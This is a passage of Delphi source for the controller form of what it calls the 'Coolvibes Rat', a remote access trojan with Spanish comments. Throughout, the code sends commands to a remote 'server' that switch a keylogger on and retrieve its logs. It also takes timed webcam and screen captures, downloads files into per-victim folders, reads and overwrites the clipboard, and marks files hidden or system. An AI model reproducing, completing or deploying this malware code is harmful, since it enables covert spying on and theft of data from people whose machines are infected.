      FormVisorDeMiniaturas := Tobject(TFormVisorDeMiniaturas.create(self,servidor,self));
    (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).show;
    if PageControlArchivos.ActivePage = TabSheetVerArchivos then
      FilePath := (EditPathArchivos.Text + mslistviewitem.Caption)
    else
      FilePath := mslistviewitem.Caption;

    (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).aniadirthumbnail(Filepath);
    
    if PageControlArchivos.ActivePage = TabSheetVerArchivos then
      mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
    else
      mslistviewitem := ListViewBuscar.GetNextItem(mslistviewitem, sdAll, [isSelected])

  end;


end;

procedure TFormControl.SpinCamChange(Sender: TObject);
begin
  try
    if SpinCam.Value < 0 then
      SpinCam.Value := 0;
    if SpinCam.Value > 30 then
      SpinCam.Value := 30;
    TimerCamCapture.Interval := SpinCam.Value*1000+250;
  except
  end;
end;

procedure TFormControl.CheckBoxAutoCamCaptureClick(Sender: TObject);
begin
  if Self.CheckBoxAutoCamCapture.Checked then
  begin
    BtnCapturarWebcam.Click; //Hacemos la primera captura
  end;

  TimerCamCapture.Interval := SpinCam.Value*1000+250;
  TimerCamCapture.Enabled  := CheckBoxAutoCamCapture.Checked;
	TabWebcam.Highlighted := TimerCamCapture.Enabled; //Para no olvidarnos que lo tenemos activo
end;

procedure TFormControl.TimerCamCaptureTimer(Sender: TObject);
begin
  if not Servidor.Connection.Connected then
  begin
    self.TimerCamCapture.Enabled := False;
    exit;
  end;
  PedirJPG(1,'');
end;

procedure TFormControl.CheckBoxMostrarVentanasOcultasClick(
  Sender: TObject);
begin
  BtnRefrescarVentanas.click;
end;

procedure TFormControl.agregardescarga(filename:string);
var
  i: integer;
  Descarga: TDescargaHandler;
begin
  //nos aseguramos de que el archivo no este en la lista de
  //descargas (sin importar si esta transfiriendo o si ya finalizo)
    for i := 0 to ListViewDescargas.Items.Count - 1 do
    begin
      Descarga := TDescargaHandler(ListViewDescargas.Items[i].Data);
      if Descarga.Origen = Filename then exit;
    end;
    Servidor.Connection.Writeln('GETFILE|' + filename);
end;

procedure TFormControl.agregardescargaencola(filename:string;tamano:integer);
var
  i: integer;
  Descarga,Descarga2: TDescargaHandler;
begin
  //nos aseguramos de que el archivo no este en la lista de
  //descargas (sin importar si esta transfiriendo o si ya finalizo)
 
    for i := 0 to ListViewDescargas.Items.Count - 1 do
    begin
      Descarga2 := TDescargaHandler(ListViewDescargas.Items[i].Data);
      if Descarga2.Origen = Filename then exit;
    end;
      CrearDirectoriosUsuario();
      Descarga := TDescargaHandler.Create(nil, FileName, Tamano,
      ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Descargas\' +
      ExtractFileName(FileName), ListViewDescargas, True);
      Descarga.callback := TransferFinishedNotification;

end;

procedure TFormControl.CrearDirectoriosUsuario();
begin
if( not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Usuarios\')) then
CreateDir(ExtractFilePath(ParamStr(0)) + 'Usuarios\');

if( not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\')) then
CreateDir(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\');

if( not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Capturas\')) then
CreateDir(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Capturas\');

if( not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Webcam\')) then
CreateDir(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Webcam\');

if( not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Thumbnails\')) then
CreateDir(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Thumbnails\');

if( not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Descargas\')) then
CreateDir(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Descargas\');
end;

procedure TFormControl.pedirJPG(tipo:integer;info:string);//0=pantalla 1=webcam 2=thumnails info=thumbnailpath
var
Pantallaautomatico : boolean;
WebcamAutomatico : boolean;
begin          //la funcion que pide las capturas de webcam, de pantalla y los thumbnails
  if (RecibiendoJPG) then exit;   //Se piden por aqui para en el futuro crear un sistema por turnos 
  RecibiendoJPG := true;
  
  if(tipo = 0) then      //CAPSCREEN
  begin
    if FormVisorCaptura = nil then
      Servidor.Connection.Writeln('CAPSCREEN|' + IntToStr(TrackBarCalidad.Position)+'|'+inttostr(imgCaptura.Height)+'|')
    else
      Servidor.Connection.Writeln('CAPSCREEN|' + IntToStr(TrackBarCalidad.Position)+'|'+inttostr((FormVisorCaptura as TScreenMax).imgCaptura.Height)+'|');
  end
  else if (tipo = 1) then //webcam
  begin
    Servidor.Connection.Writeln('CAPTURAWEBCAM|' + IntToStr(ComboboxWebcam.ItemIndex) +
    '|' + IntToStr(TrackBarCalidadWebcam.Position));
  end
  else if (tipo = 2) then //thumbnails
  begin
    Servidor.Connection.Writeln(info);
  end
  else if(tipo = 3)  then//KEYLOGGERLOG
  begin
    Servidor.Connection.Writeln('RECIBIRKEYLOGGER');
  end;
end;
procedure TFormControl.Guardarimagen1Click(Sender: TObject);
begin
  DlgGuardar.Title      := _('Guardar imagen ::Coolvibes::');
  DlgGuardar.InitialDir := GetCurrentDir();
  DlgGuardar.Filter     := _('Imagen')+' .Jpeg|*.jpg';
  DlgGuardar.DefaultExt := 'jpg';
  if DlgGuardar.Execute then
  begin
    if Pagecontrol.activepage = TabScreenCap then
      //Se está guardando una captura
      imgCaptura.Picture.SaveToFile(DlgGuardar.FileName)
    else  //Sino es una webcam
      imgWebcam.Picture.SaveToFile(DlgGuardar.FileName);
    StatusBar.Panels[1].Text := _('Imagen guardada como: ') + DlgGuardar.FileName;
  end;
end;

procedure TFormControl.btnGuardarImagenClick(Sender: TObject);
var
  popupPoint : TPoint;
begin
  popupPoint.X := TSpeedButton(Sender).left;
  popupPoint.Y := TSpeedButton(Sender).top;
  popupPoint := ClientToScreen(popupPoint) ;

  Popupguardarpantallaowebcam.popup(popupPoint.X, popupPoint.Y) ;

end;

procedure TFormControl.PopupGuardarPantallaoWebcamPopup(Sender: TObject);
begin
  if PageControl.activepage = TabScreencap then
  begin
    PopupGuardarPantallaoWebcam.items[0].caption := _('Guardar captura de pantalla');
    if(PrefijoGuardarCaptura = '') then
    begin
      PopupGuardarPantallaoWebcam.items[1].caption := _('Activar guardado automático');
      PopupGuardarPantallaoWebcam.items[1].checked := false;
    end
    else
    begin
      PopupGuardarPantallaoWebcam.items[1].caption := _('Desactivar guardado automático');
      PopupGuardarPantallaoWebcam.items[1].checked := true;
    end;
  end
  else
  begin
    PopupGuardarPantallaoWebcam.items[0].caption := _('Guardar captura de webcam');
    if(PrefijoGuardarWebcam = '') then
    begin
      PopupGuardarPantallaoWebcam.items[1].caption := _('Activar guardado automático');
      PopupGuardarPantallaoWebcam.items[1].checked := false;
    end
    else
    begin
      PopupGuardarPantallaoWebcam.items[1].caption := _('Desactivar guardado automático');
      PopupGuardarPantallaoWebcam.items[1].checked := true;
    end;
  end;
end;

procedure TFormControl.Guardadoautomtico1Click(Sender: TObject);
begin
if((PrefijoGuardarCaptura = '') and (PageControl.activepage = TabScreencap)) then
    PrefijoGuardarCaptura := InputBox(_('Prefijo captura'),_('Prefijo captura'), _('captura_'))
else
if((PrefijoGuardarWebcam = '') and (PageControl.activepage = TabWebcam)) then
    PrefijoGuardarWebcam := InputBox(_('Prefijo captura'),_('Prefijo captura'), _('webcam_'))
else
if((PrefijoGuardarCaptura <> '') and (PageControl.activepage = TabScreencap)) then
    PrefijoGuardarCaptura := ''
else
if((PrefijoGuardarWebcam <> '') and (PageControl.activepage = TabWebcam)) then
    PrefijoGuardarWebcam := '';
end;

procedure TFormControl.TabKeyloggerShow(Sender: TObject);
begin
  if(not ProgressBarKeylogger.enabled) then  //al mostrarnos por primera vez
  begin
    SpeedButtonRecibirLog.enabled := false;  //no se ponen deshabilitados desde el principio porque dan error: Controlador no valido
    EditLogName.enabled := false;
    SpeedButtonGuardarLog.enabled := false;
    SpeedButtonActivarKeylogger.enabled := false;
    SpeedButtonEliminarLog.enabled := false;
    Servidor.Connection.Writeln('ESTADOKEYLOGGER'); //nada mas mostrarnos obtenemos el estado del keylogge
  end;
end;

procedure TFormControl.SpeedButtonRecibirLogClick(Sender: TObject);
begin
  if not Servidor.Connection.Connected then exit;
  SpeedButtonRecibirLog.enabled := false;  //Por estetica
  pedirJPG(3,''); //no es un jpeg pero bueno......
end;

procedure TFormControl.SpeedButtonActivarKeyloggerClick(Sender: TObject);
begin
  SpeedButtonActivarKeylogger.enabled := false;
  if(SpeedButtonActivarKeylogger.caption = _('Activar Keylogger')) then
  begin
    if(EditLogName.text <> '') then
      Servidor.Connection.WriteLn('ACTIVARKEYLOGGER|'+EditLogName.text+'|')
    else
      SpeedButtonActivarKeylogger.enabled := true;
  end
  else
    Servidor.Connection.WriteLn('DESACTIVARKEYLOGGER|');

end;

procedure TFormControl.SpeedButtonEliminarLogClick(Sender: TObject);
begin
 Servidor.Connection.Writeln('ELIMINARLOGKEYLOGGER');
end;

procedure TFormControl.CheckBoxOnlineKeyloggerClick(Sender: TObject);
function BooleanToStr(Bool: boolean; TrueString, FalseString: string): string;
begin
  if Bool then
    Result := TrueString
  else
    Result := FalseString;
end;
begin
  if not Servidor.Connection.Connected then exit;
  Servidor.Connection.WriteLn('ONLINEKEYLOGGER|'+BooleanToStr(CheckBoxOnlineKeylogger.checked,'ACTIVAR','DESACTIVAR')+'|');
end;

procedure TFormControl.SpeedButtonGuardarLogClick(Sender: TObject);
begin
  DlgGuardar.Title      := _('Guardar Log de Keylogger ::Coolvibes Rat::');
  DlgGuardar.InitialDir := GetCurrentDir();
  DlgGuardar.Filter     := _('Texto .txt');
  DlgGuardar.DefaultExt := 'txt';
  if DlgGuardar.Execute then
  begin 
    RichEditKeylogger.plaintext := true;  //Se guarda como archivo de texto plano
    RichEditKeylogger.lines.savetofile(DlgGuardar.FileName);

    StatusBar.Panels[1].Text := _('Log guardado como: ') + DlgGuardar.FileName;
  end;
end;

procedure TFormControl.TabServidorShow(Sender: TObject);
begin
  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
    BtnActualizarServidorInfo.click;
end;

procedure TFormControl.TabVentanasShow(Sender: TObject);
begin
  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
   BtnRefrescarVentanas.click;
end;

procedure TFormControl.TabServiciosShow(Sender: TObject);
begin
  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
   BtnServicios.click;
end;

procedure TFormControl.TabScreencapShow(Sender: TObject);
begin
  Servidor.Connection.Writeln('DATOSCAPSCREEN');
  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
  begin
    BtnCapturarScreen.click;
  end;
end;

procedure TFormControl.TabWebcamShow(Sender: TObject);
begin
  if(FormOpciones.CheckBoxAutoRefrescar.checked) and (ComboboxWebcam.text = '') then
    BtnObtenerWebcams.click;
end;

procedure TFormControl.CheckBoxTamanioRealClick(Sender: TObject);
begin
  if CheckBoxTamanioReal.checked then
  begin
    imgcaptura.align := alnone;
    imgCaptura.height := alturapantalla;   //La anchura se calcula sola al recibir la captura
  end
  else
  begin
    imgcaptura.align := alLeft;
  end;
  BtnCapturarScreen.click;
end;

procedure TFormControl.PrevisualizarImagenes1Click(Sender: TObject);
begin
  PrevisualizarImagenes1.checked := not PrevisualizarImagenes1.checked;
  PrevisualizacionActiva := PrevisualizarImagenes1.checked;

  if PrevisualizacionActiva then   //iconos grades
  begin
    Listviewarchivos.viewstyle := vsIcon;
  end
  else
  begin
    Listviewarchivos.viewstyle := vsReport;
  end;

  BtnActualizarArchivos.click;
end;

procedure TFormControl.Copiar1Click(Sender: TObject);
begin

  if Servidor.Connection.Connected then
  begin
    mslistviewitem := ListViewArchivos.Selected;
    while Assigned(mslistviewitem) do
    begin
      PortaPapeles := Portapapeles+EditPathArchivos.text+mslistviewitem.caption+'|';
      mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);

end;

procedure TFormControl.Pegar1Click(Sender: TObject);
var
  tmp : string;
begin
  while pos('|',portapapeles) > 0 do
  begin
    tmp := Copy(portapapeles, 1, Pos('|', portapapeles) - 1);
    Delete(portapapeles, 1, Pos('|', PortaPapeles));
    Servidor.Connection.Writeln('COPYF|'+tmp+'|'+EditPathArchivos.Text +extractfilename(tmp)+'|');
  end;
  btnactualizararchivos.Click;
end;

procedure TFormControl.CargarThumbsFileAlListview(thumbsfilepath:string);
var ThumbsDBFile:TStorage;       //TStorage for thumbs.db file
    ThumbsDBCatalog:TStream;     //TStream for file catalog inside thumbs.db
    ThumbsDB_JPEG:tstream;       //stream for thumb image inside thumbs.db
    ThmInfo:TAxThumbsDBFileInfo; //info structure for each item in thumbs.db
    i,j,o:dword;                   //indexes
    Filename:string;             //Filename read from catalog
    WideChr:word;                //placeholder to read widechar filename
    dwIndex:dword;               //placeholder to calculate item names
    IndexStr:string;             //name of TStorage item for each catalog item
    ThumbnailItems:tstringlist;
    FCatalogSignatur:dword;   //unknown dword with value 00 07 00 10 hex
    FCatalogItemCount:dword;  //number of items in catalog
    FCatalogThumbSize:TSize;  //max. size of thumbnails
    bit,nbit: Tbitmap;
    tmpint,tmpint2 : integer;
    imglist : Timagelist;
    t : integer;
begin
  listviewarchivos.items.beginupdate;
  cargariconos(false);
  ThumbnailItems := TStringList.Create;
  imglist := Timagelist.create(nil);
  imglist.Width := Iconosgrandes.width;
  imglist.Height := Iconosgrandes.Height;
  ThumbsDBFile := TStgFile.OpenFile(thumbsfilepath, STGM_READ or STGM_SHARE_EXCLUSIVE );
  try
    //open catalog of files inside thumbs.db
    ThumbsDBCatalog := ThumbsDBFile.OpenStream( 'Catalog', STGM_READ or STGM_SHARE_EXCLUSIVE );
    try
      //read catalog
      //first dword = ??? always 00070010 hex
      ThumbsDBCatalog.Read(FCatalogSignatur,4);
      //second dword = number of items
      ThumbsDBCatalog.Read(FCatalogItemCount,4);
      //dword 3+4 = size of thumbs, not used
      ThumbsDBCatalog.Read(FCatalogThumbSize,8);

      for i := 0 to FCatalogItemCount - 1 do
      begin
        ThmInfo := TAxThumbsDBFileInfo.Create;

        //first dword = ??? always 2x000000 hex
        ThumbsDBCatalog.Read(ThmInfo.dwFirstDummy,4);
        //second dword = index of item
        ThumbsDBCatalog.Read(ThmInfo.dwIndex,4);
        //dword 3+4 date and time ???
        ThumbsDBCatalog.Read(ThmInfo.dwFileDate,4);
        //second dword = index of item
        ThumbsDBCatalog.Read(ThmInfo.dwThumbDate,4);

        //read filename as widechar and convert to string
        Filename := '';
        repeat
          ThumbsDBCatalog.Read(WideChr,2);
          if WideChr <> 0 then
          begin
            Filename := Filename + char(WideChr);
          end;
        until WideChr = 0;
        //additional 00 00 word at each item end
        ThumbsDBCatalog.Read(WideChr,2);

        //calculate name of item from catalog index
        //for any unknown reason, the name is calculated from index as
        // inttostr(1. digit) + inttostr(2. digit) + ... (reverse order)
        IndexStr := '';
        dwIndex := ThmInfo.dwIndex;
        while dwIndex > 0 do
        begin
          j := dwIndex mod 10;
          IndexStr := IndexStr + IntToStr(j);
          dwIndex := dwIndex div 10;
        end;

        //read thumbnail as JPEG file
        ThmInfo.jpgThumb := TJPEGImage.Create;
        ThumbsDB_JPEG := ThumbsDBFile.OpenStream(IndexStr, STGM_READ or STGM_SHARE_EXCLUSIVE );
        try
          //12 bytes in from of JPEG stream
          ThumbsDB_JPEG.Read(ThmInfo.dwUnknown1,4);
          ThumbsDB_JPEG.Read(ThmInfo.dwUnknown1,4);
          ThumbsDB_JPEG.Read(ThmInfo.dwSizeOfJPGStream,4);

          //read stream as JPEG and store in thumb info structure
          try
            ThmInfo.jpgThumb.LoadFromStream(ThumbsDB_JPEG);
          except
          end;

           for o := 0 to listviewarchivos.items.count-1 do
           begin
            if AnsiLowerCase(listviewarchivos.items[o].caption) = AnsiLowerCase(Filename) then
            begin
              if (listviewarchivos.items[o].imageindex <> 3) and (listviewarchivos.items[o].imageindex <> 4) then
                begin
                sleep(100);//Si se baja mucho este valor algunas imagenes no cargan, ni idea porque pasa eso...
                 
                  bit := tbitmap.create();

                  bit.assign(ThmInfo.jpgThumb);
                  nbit := tbitmap.create();
                  bit.pixelformat := pf32bit;
                  nbit.Width := IconosGrandes.width;
                  nbit.Height := IconosGrandes.height;
              
                                         //centramos la imagen
                  tmpint := (nbit.height-bit.height) div 2;//"top" de la esquina sup izq
                  tmpint2 := (nbit.width-bit.width) div 2; //"left" de la esquina sup izq
                  if tmpint < 0 then tmpint := 0;
                  if tmpint2 < 0 then tmpint2 := 0;

                  if not ((bit.Width > nbit.Width) or (bit.height > nbit.height)) then
                    StretchBlt(nBit.Canvas.Handle, tmpint2, tmpint, nBit.Width, nBit.Height, Bit.Canvas.Handle, 0, 0,nBit.Width, nBit.Height, SRCCOPY)
                  else
                    StretchBlt(nBit.Canvas.Handle, tmpint2, tmpint, Bit.Width, Bit.Height, Bit.Canvas.Handle, 0, 0,Bit.Width, Bit.Height, SRCCOPY);

                  nbit.Width := IconosGrandes.width;
                  nbit.Height := IconosGrandes.height;
                   t := Imglist.add(nbit,nil);
                  listviewarchivos.items[o].imageindex := IconosGrandes.count+t;
                  Statusbar.panels[1].text := _('Cargadas ')+inttostr(t+1)+_(' de ')+inttostr(FCatalogItemCount)+' Miniaturas.';
                  nbit.free;
                  bit.free;
                  bit := nil;
                  nbit := nil;
                end;
            end;
           end;


        finally
          ThumbsDB_JPEG.Free;

        end;
        //save structure to list
        ThumbnailItems.AddObject(AnsiLowerCase(Filename),ThmInfo);
      end;
    finally
      ThumbsDBCatalog.Free;
    end;
  finally
    ThumbsDBFile.free;
  end;
  IconosGrandes.addimages(imglist);
  listviewarchivos.items.endupdate;
  Statusbar.panels[1].text := _('Miniaturas cargadas!');
end;


procedure TFormControl.Abrircarpetadescargas1Click(Sender: TObject);
begin
  CrearDirectoriosUsuario();
  ShellExecute(0, 'open', pchar(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Descargas\'), '', PChar(ExtractFilePath(ParamStr(0)) + 'Usuarios\'+NombrePC+'\Descargas\'), SW_NORMAL);
end;

procedure TFormControl.BuscarArchivos1Click(Sender: TObject);
begin
  PageControlArchivos.activepage := TabSheetBuscar;
end;

procedure TFormControl.ListViewArchivosCustomDrawItem(
  Sender: TCustomListView; Item: TListItem; State: TCustomDrawState;
  var DefaultDraw: Boolean);
begin
  if item = nil then exit;
  if item.subitems.count < 3 then exit;

  if lowercase(item.caption) = 'thumbs.db' then  //archivos de miniatura de imagenes
    Sender.Canvas.Font.Color := clBlue
  else
  if ((pos('Oculto',item.subitems[2]) > 0) or (pos('Sistema',item.subitems[2]) > 0)) then  //Ocultos o Sistema en gris
    Sender.Canvas.Font.Color := clGray;

end;

procedure TFormControl.Oculto2Click(Sender: TObject);
var
  CurrentAtrib : string;
begin
  if Servidor.Connection.Connected then
  begin
    mslistviewitem := ListViewArchivos.Selected;
    while Assigned(mslistviewitem) do
    begin
      CurrentAtrib := '';
      if not (pos('Oculto',mslistviewitem.subitems[2]) > 0) then //cambiamos
        CurrentAtrib := 'Oculto ';
      if (pos('Sistema',mslistviewitem.subitems[2]) > 0) then
        CurrentAtrib := CurrentAtrib+'Sistema ';
      if (pos('Lectura',mslistviewitem.subitems[2]) > 0) then
        CurrentAtrib := CurrentAtrib+'Lectura ';

      Servidor.Connection.Writeln('CHATRIBUTOS|' + EditPathArchivos.Text +
      mslistviewitem.Caption+'|'+CurrentAtrib+'|');
      mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
    btnactualizararchivos.Click;
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.Sistema1Click(Sender: TObject);
var
  CurrentAtrib : string;
begin
  if Servidor.Connection.Connected then
  begin
    mslistviewitem := ListViewArchivos.Selected;
    while Assigned(mslistviewitem) do
    begin
      CurrentAtrib := '';
      if (pos('Oculto',mslistviewitem.subitems[2]) > 0) then //cambiamos
        CurrentAtrib := 'Oculto ';
      if not (pos('Sistema',mslistviewitem.subitems[2]) > 0) then
        CurrentAtrib := CurrentAtrib+'Sistema ';
      if (pos('Lectura',mslistviewitem.subitems[2]) > 0) then
        CurrentAtrib := CurrentAtrib+'Lectura ';

      Servidor.Connection.Writeln('CHATRIBUTOS|' + EditPathArchivos.Text +
      mslistviewitem.Caption+'|'+CurrentAtrib+'|');
      mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
    btnactualizararchivos.Click;
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.Slolectura1Click(Sender: TObject);
var
  CurrentAtrib : string;
begin
  if Servidor.Connection.Connected then
  begin
    mslistviewitem := ListViewArchivos.Selected;
    while Assigned(mslistviewitem) do
    begin
      CurrentAtrib := '';
      if (pos('Oculto',mslistviewitem.subitems[2]) > 0) then //cambiamos
        CurrentAtrib := 'Oculto ';
      if (pos('Sistema',mslistviewitem.subitems[2]) > 0) then
        CurrentAtrib := CurrentAtrib+'Sistema ';
      if not (pos('Lectura',mslistviewitem.subitems[2]) > 0) then
        CurrentAtrib := CurrentAtrib+'Lectura ';

      Servidor.Connection.Writeln('CHATRIBUTOS|' + EditPathArchivos.Text +
      mslistviewitem.Caption+'|'+CurrentAtrib+'|');
      mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
    end;
    btnactualizararchivos.Click;
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.SpeedButtonRutasRapidasClick(Sender: TObject);
var
  popupPoint : TPoint;
begin
 popupPoint.X := SpeedButtonRutasRapidas.left;
 popupPoint.Y := SpeedButtonRutasRapidas.top  + (SpeedButtonRutasRapidas.Height DIV 2) ;
 popupPoint := ClientToScreen(popupPoint);

 PopupRutasRapidas.popup(popupPoint.X, popupPoint.Y) ;
end;

procedure TFormControl.Windir1Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('GORUTA|WINDIR')
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.Directoriodesistema1Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('GORUTA|SYSDIR')
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);

end;

procedure TFormControl.Misdocumentos1Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('GORUTA|DOCUMENTOS')
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.Escritorio1Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('GORUTA|ESCRITORIO')
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.ArchivosRecientes1Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('GORUTA|RECIENTE')
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.Directoriodeinstalaciondecoolvibes1Click(
  Sender: TObject);
begin
  if Servidor.Connection.Connected then
    Servidor.Connection.Writeln('GORUTA|CURRENTDIR')
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.ComboBoxWebcamKeyPress(Sender: TObject;
  var Key: Char);
begin
  Key:= #0;
end;

procedure TFormControl.ListViewVentanasCustomDrawItem(
  Sender: TCustomListView; Item: TListItem; State: TCustomDrawState;
  var DefaultDraw: Boolean);
begin
  if item = nil then exit;
  if item.subitems.count > 0 then
  if item.subitems[1] = _('Activa') then
  begin
    Sender.Canvas.Font.style := [fsbold];
    Sender.Canvas.Font.Color := clGreen;
  end;
end;

procedure TFormControl.TabSheetTransferenciasShow(Sender: TObject);
begin
  TabSheetTransferencias.Highlighted := false;
end;

procedure TFormControl.TabSheetServidorShow(Sender: TObject);
begin
  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
   BtnActualizarServidorInfo.click;
end;

procedure TFormControl.TabSheetInfoSistemaShow(Sender: TObject);
begin
  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
   BtnRefrescarInformacion.click;
end;

procedure TFormControl.TabSheetVerArchivosShow(Sender: TObject);
begin
if(FormOpciones.CheckBoxAutoRefrescar.checked) then
   BtnVerunidades.click;
end;

procedure TFormControl.Refrescar1Click(Sender: TObject);
begin
if BtnVerRegisto.enabled then
  BtnVerRegisto.click;
end;

procedure TFormControl.SpeedButtonBuscarClick(Sender: TObject);
begin
  if SpeedButtonBuscar.caption = _('Comenzar') then   //comenzar
  begin
    ListviewBuscar.Items.Clear;
    SpeedButtonBuscar.caption := _('Parar');
    editbuscar.Enabled := false;
    TabSheetBuscar.highlighted := true; 
    Servidor.Connection.WriteLn('STARTSEARCH|'+editbuscar.text+'|');
  end
  else
  begin //Parar
    Servidor.Connection.WriteLn('STOPSEARCH');
  end;
end;

procedure TFormControl.FormClose(Sender: TObject;
  var Action: TCloseAction);
begin
  FormMain.ControlWidth := self.Width;
  FormMain.ControlHeight := self.Height;
  CheckBoxAutoCapturaScreen.checked := false;
  CheckBoxAutoCamCapture.checked := false;
  CheckBoxOnlineKeylogger.checked := false;
end;

procedure TFormControl.ListViewBuscarContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i : integer;
begin
  for i:= 0 to PopupFileManager.items.count-1 do
  begin
    PopupFileManager.items[i].visible := false;//Los escondemos
    PopupFileManager.items[i].enabled := false;
  end;

  if listviewbuscar.selected <> nil then
  begin
    PopupFileManager.items[0].enabled := true; //descargar
    PopupFileManager.items[1].enabled := true; //encolar decarga
    PopupFileManager.items[4].enabled := true; //Abrir/ejecutar
    PopupFileManager.items[5].enabled := true; //Eliminar
    PopupFileManager.items[10].enabled := true;//Visor de imagenes avanzado
    PopupFileManager.items[14].enabled := true;//abrir directorio descargas
    PopupFileManager.items[15].enabled := true;//Abrir directorio del archivo
  end
  else
  begin
    PopupFileManager.items[0].enabled := false; //descargar
    PopupFileManager.items[1].enabled := false; //encolar decarga
    PopupFileManager.items[4].enabled := false; //Abrir/ejecutar
    PopupFileManager.items[5].enabled := false; //Eliminar
    PopupFileManager.items[10].enabled := false;//Visor de imagenes avanzado
    PopupFileManager.items[14].enabled := true;//abrir directorio descargas
    PopupFileManager.items[15].enabled := false;//Abrir directorio del archivo
  end;

  PopupFileManager.items[0].visible := true; //descargar
  PopupFileManager.items[1].visible := true; //encolar decarga
  PopupFileManager.items[4].visible := true; //Abrir/ejecutar
  PopupFileManager.items[5].visible := true; //Eliminar
  PopupFileManager.items[10].visible := true;//Visor de imagenes avanzado
  PopupFileManager.items[14].visible := true;//abrir directorio descargas
  PopupFileManager.items[15].visible := true;//Abrir directorio del archivo

end;

procedure TFormControl.Abrirdirectorio1Click(Sender: TObject);
begin
  PageControlArchivos.ActivePage := TabSheetVerArchivos;
  EditpathArchivos.text := extractfilepath(listviewbuscar.selected.caption);
  BtnActualizarArchivos.click;
end;

procedure TFormControl.FormShortCut(var Msg: TWMKey; var Handled: Boolean);
begin
  if not self.active then exit;

  if Msg.charcode = VK_ESCAPE then
    self.Close;

  if Msg.CharCode = VK_F5 then //Refresh!
  begin
    if PageControl.activepage = TabInfo then
    begin
      if PageControlInformacion.ActivePage = TabSheetServidor then
        BtnActualizarServidorInfo.click
      else
        BtnRefrescarInformacion.click;
    end
    else if PageControl.activepage = TabFileManager then
    begin
      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
        BtnActualizarArchivos.click
      else
      if PageControlArchivos.ActivePage = TabSheetBuscar then
        SpeedButtonBuscar.click;
    end
    else if PageControl.activepage = TabProcesos then
      BtnRefrescarProcesos.click
    else if PageControl.activepage = TabVentanas then
      BtnRefrescarVentanas.click
    else if PageControl.activepage = TabRegistro then
      BtnVerRegisto.click
    else if PageControl.activepage = TabServicios then
      BtnServicios.click
    else if PageControl.activepage = TabScreencap then
      BtnCapturarScreen.click
    else if PageControl.activepage = TabWebcam then
      BtnCapturarWebcam.click;
  end;
end;

procedure TFormControl.TabSheetBuscarShow(Sender: TObject);
begin
  if EditBuscar.enabled then
    EditBuscar.text := EditPathArchivos.text+'*';

end;

// Portapapeles!
procedure TFormControl.SpeedButtonClipBoard1Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
  begin
    Servidor.Connection.Writeln('GETCLIP');
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;
procedure TFormControl.SpeedButtonClipBoard2Click(Sender: TObject);
begin
  if Servidor.Connection.Connected then
  begin
    Servidor.Connection.Writeln('SETCLIP|'+ MemoClipBoard.Text);
  end
  else
    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
end;


procedure TFormControl.TabProcesosShow(Sender: TObject);
begin
  if(FormOpciones.CheckBoxAutoRefrescar.checked) then
   BtnRefrescarProcesos.click;
end;

end.//Fin del proyecto
